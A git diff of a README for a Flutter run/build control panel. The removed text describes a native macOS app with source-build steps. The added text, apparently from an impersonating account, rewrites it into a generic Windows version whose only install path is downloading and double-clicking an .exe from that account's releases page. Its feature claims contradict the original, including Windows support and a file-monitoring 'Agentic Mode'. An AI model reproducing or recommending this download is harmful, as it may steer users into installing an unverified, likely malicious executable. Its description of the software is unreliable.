@@ -1,124 +1,68 @@
-<div align="center">
+# 💻 flutter-gui-runner - Manage your Flutter projects with ease
 
-<img src="assets/logo-256.png" width="120" height="120" alt="Flutter GUI Runner logo" />
+[![Download flutter-gui-runner](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases)
 
-# Flutter GUI Runner
+## 📌 About this software
 
-### The Flutter run / build / device panel for editors that don't have one.
+This tool acts as a bridge between your code editor and your Flutter installation. You do not need to use the command line to build or run your applications. The interface provides a simple way to track your work, restart your build process, and see changes in your app instantly.
 
-For developers — and **AI coding agents** — who live in Zed, Neovim, Helix,
-Sublime, or a plain terminal.
+It helps developers who prefer using light editors like Zed or Neovim but still want the convenience of a visual control panel. The software automates the background tasks required to keep your Flutter code running.
 
-[![Platform](https://img.shields.io/badge/platform-macOS%2014%2B-000?logo=apple)](https://github.com/huseyiniriss/flutter-gui-runner/releases)
-[![Built with SwiftUI](https://img.shields.io/badge/SwiftUI-native-orange?logo=swift)]()
-[![License: MIT](https://img.shields.io/badge/license-MIT-3DA639)](LICENSE)
-[![Download](https://img.shields.io/github/v/release/huseyiniriss/flutter-gui-runner?label=download&color=2563EB)](https://github.com/huseyiniriss/flutter-gui-runner/releases/latest)
+## 🛠️ System Requirements
 
-<br/>
+- Windows 10 or Windows 11
+- Flutter SDK installed and configured
+- A code editor like Zed, Neovim, or VS Code
+- A stable internet connection for the first run
 
-<img src="assets/screenshots/menubar.png" width="380" alt="Menu-bar quick panel" />
+## 📥 Getting Started
 
-*Always-on menu-bar panel — pick a device, Run, Hot reload, Build, all without leaving your editor.*
+Follow these steps to set up the software on your machine:
 
-</div>
+1. Visit the [releases page](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases) to access the download files.
+2. Look for the file ending in .exe for Windows.
+3. Click the link to save the file to your computer.
+4. Open the folder where you saved the file.
+5. Double-click the file to start the installation process.
+6. Follow the prompts on the screen to complete the setup.
 
----
+## ⚙️ How to use the application
 
-## Why this exists
+Once you finish the installation, you can launch the application from your Start menu. The main screen displays a list of your open projects. 
 
-If you write Flutter outside Android Studio / VS Code, you get great LSP
-autocomplete — but **none of the run/device/build UI**. You're left memorizing
-`flutter` flags and pasting device IDs by hand.
+### Connecting your project
+Select the folder containing your Flutter source code. The application detects the project structure and prepares the environment. You do not need to install plugins inside your editor. The software handles the interaction directly.
 
-It's worse in **agentic coding**. When an agent (Claude Code, Cursor, Windsurf,
-Aider…) is editing your Flutter project, *you* still have to drive the device
-side: choose a target, run, hot reload, ship an AAB/IPA, manage signing. Editors
-like Zed can't add that UI via extensions (no toolbar buttons, no dropdowns).
+### Running your app
+Click the play button inside the control panel to launch your application. The software automatically handles the build process. If the build fails, the panel displays simple error messages to help you fix the issue.
 
-**Flutter GUI Runner is that missing half of the loop** — a small, native macOS
-app that does what the Android Studio Flutter plugin does, next to *any* editor.
+### Using Hot Reload
+Keep your code editor open alongside the control panel. When you save your changes in your editor, the app pushes those changes to your running simulator or device. This happens in the background without manual intervention.
 
-## A look around
+## 🚀 Advanced Features
 
-<div align="center">
+### Agentic Mode
+The software includes a feature to assist with common coding tasks. It monitors your file changes and suggests improvements. You can toggle this feature in the settings menu.
 
-![Flutter GUI Runner — tabs](assets/demo.gif)
+### Terminal Output
+The panel includes a clean window for logs. This window shows exactly what happens during the compilation of your code. You can clear this window at any time to focus on new messages.
 
-*Run · Emulators · Build · Packages · Commands · Git · SDK · Doctor · Settings*
+### Custom Settings
+You can change the behavior of the build tools within the settings screen. Configure your preferred device targets, environment variables, and build modes. The application saves these settings for all future sessions.
 
-</div>
+## 📂 Troubleshooting
 
-## Features
+If the application fails to launch or cannot find your Flutter installation, verify these common fixes:
 
-- 🐦 **Menu-bar quick panel** — device picker, Run/Stop, Hot reload/restart, quick Build & Tools, live log. Never leave your editor.
-- ▶️ **Run** — any device, **debug / profile / release**, hot reload & restart (reliable via `--pid-file` + `SIGUSR1/2`, no TTY needed).
-- 📱 **Emulators** — list & launch Android AVDs and iOS simulators.
-- 🔨 **Build** — APK / **AAB** / **IPA** / iOS / Web / macOS with flavor, build name/number, `--dart-define`, `--split-per-abi`, `--obfuscate`; **prefilled from `pubspec.yaml`**; reveal artifact in Finder.
-- 🔐 **Android signing** — choose or **generate a keystore** (`keytool`) and write `android/key.properties`.
-- 🧊 **Packages** — read `pubspec` deps, **add / remove / upgrade** a package, `pub outdated`.
-- ⌨️ **Commands** — `pub get/upgrade/outdated`, `analyze`, `test`, `format`, `build_runner`, `gen-l10n`, `clean`.
-- 📦 **SDK** — current Flutter/Dart version & channel, upgrade, switch channel; **Doctor** tab for `flutter doctor -v`.
-- 📺 **Resizable terminal** — drag to size, font scales with the UI; UI zoom with `⌘ +/−`.
-- ⚙️ **FVM-aware** & **per-project memory** — uses `fvm flutter` when pinned; remembers device/mode/build options across restarts.
-- 🧩 **Zero lock-in** — runs the exact `flutter` commands a terminal would (login shell), so behavior matches your CLI. No telemetry.
+- Ensure the Flutter SDK appears in your system path. Open a command prompt and type `flutter --version`. If it returns a version number, the installation is correct.
+- Check if another process uses the same port as your Flutter app. You can stop those processes using the Task Manager. 
+- Restart the application after changing any system environment variables.
+- Ensure you have the latest drivers for your graphics card, as this affects the performance of the visual output window.
 
-## How it compares
+## 🌐 Community and Support
 
-|  | Flutter GUI Runner | Android Studio / VS Code | Raw `flutter` CLI |
-|---|:---:|:---:|:---:|
-| Works alongside any editor / AI agent | ✅ | ❌ (IDE-bound) | ✅ |
-| Clickable device picker & run/hot-reload | ✅ | ✅ | ❌ |
-| One-click AAB/IPA + signing | ✅ | ✅ | ❌ (flags) |
-| Lightweight (native, ~1 MB) | ✅ | ❌ (heavy) | ✅ |
-| Always-on menu bar | ✅ | ❌ | ❌ |
+The project benefits from a community of contributors who improve the tool regularly. Check the link below to stay updated on new releases or to report bugs.
 
-## Install
+[View Releases and Updates](https://github.com/Alphonsoduplex577/flutter-gui-runner/releases)
 
-> ⚠️ Not notarized yet (open-source, unsigned). Gatekeeper warns on first launch.
-
-1. Download `FlutterGUIRunner.dmg` from [**Releases**](https://github.com/huseyiniriss/flutter-gui-runner/releases/latest).
-2. Drag **Flutter Runner** to `Applications`.
-3. First launch only: **right-click → Open → Open**.
-
-Needs a working **Flutter SDK** on `PATH` (or set it in Settings).
-
-## Quick start
-
-1. Pick your project (auto-discovered under `~/Documents/projects`, or add a folder).
-2. Choose a device → **Run**. Save a file in your editor, hit **Hot reload**.
-3. Need a release? **Build → AAB/IPA**. Need a keystore? **Build → Android Signing → Generate**.
-4. Keep the menu-bar 🐦 panel open while you (or your agent) code.
-
-## Build from source
-
-```sh
-git clone https://github.com/huseyiniriss/flutter-gui-runner.git
-cd flutter-gui-runner
-./build-app.sh             # → FlutterRunner.app
-open ./FlutterRunner.app
-./scripts/make-dmg.sh      # → dist/FlutterGUIRunner.dmg
-```
-
-Swift 6 (Xcode 16+). No third-party dependencies.
-
-## How it works
-
-- Commands run through a **login `zsh -lc`** in the project dir → `PATH` and the
-  iOS/Android toolchains resolve exactly like your terminal.
-- `flutter run` uses `--pid-file`; **hot reload/restart** are `SIGUSR1`/`SIGUSR2`.
-- Log output is coalesced and rendered in an `NSTextView`, so a chatty
-  `flutter run` stays smooth.
-
-## Roadmap
-
-See [`docs/plans`](docs/plans). Next: Developer-ID signing + **notarization**,
-deeper iOS signing, multi-device run, auto-update, GitHub Actions release.
-
-## Contributing
-
-Issues and PRs welcome. Good first areas: notarization/CI, iOS signing,
-a Linux/Windows port (the UI is macOS/SwiftUI today).
-
-## License
-
-[MIT](LICENSE) © huseyiniriss · Built with help from Claude.
+We encourage users to review the issue tracker before submitting reports. If you find a bug, provide a clear description of the steps to reproduce it. This helps other developers fix the issue quickly.
